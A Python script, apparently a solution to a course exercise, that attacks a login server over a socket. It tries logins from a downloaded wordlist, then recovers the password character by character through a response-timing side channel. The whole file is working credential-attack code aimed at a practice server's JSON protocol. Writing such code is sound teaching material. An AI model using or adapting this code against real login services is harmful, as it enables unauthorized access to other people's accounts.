import socket
import sys
import string
import urllib.request
import json
from datetime import datetime, timedelta

symbols = string.ascii_lowercase + string.ascii_uppercase + string.digits
args = sys.argv
ip_address = args[1]
port = int(args[2])

url = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'
with urllib.request.urlopen(url) as f:
    logins = f.read().decode('utf-8')

logins_list = logins.splitlines()

with socket.socket() as client_socket:
    address = (ip_address, port)
    client_socket.connect(address)
    for login in logins_list:
        creds = dict([('login', login), ('password', ' ')])
        data = json.dumps(creds).encode()
        client_socket.send(data)
        response = client_socket.recv(1024)
        response = response.decode()
        response = json.loads(response)
        result = response['result']
        if result == 'Wrong login!':
            continue
        elif result == 'Wrong password!':
            break
        elif result == 'Connection success!':
            print(json.dumps(creds))
            exit()
        elif result == 'Exception happened during login':
            continue

    password = ''
    while True:
        for c in symbols:
            pass_test = password + c
            creds = dict([('login', login), ('password', pass_test)])
            data = json.dumps(creds).encode()
            start = datetime.now()
            client_socket.send(data)
            response = client_socket.recv(1024)
            finish = datetime.now()
            response = json.loads(response.decode())
            result = response['result']
            if result == 'Wrong password!':
                diff_microsecs = finish - start
                if diff_microsecs > timedelta(microseconds=10000):
                    password = pass_test
                    break
                else:
                    continue
            elif result == "Too many attempts":
                exit()
            elif result == 'Connection success!':
                print(json.dumps(creds))
                exit()
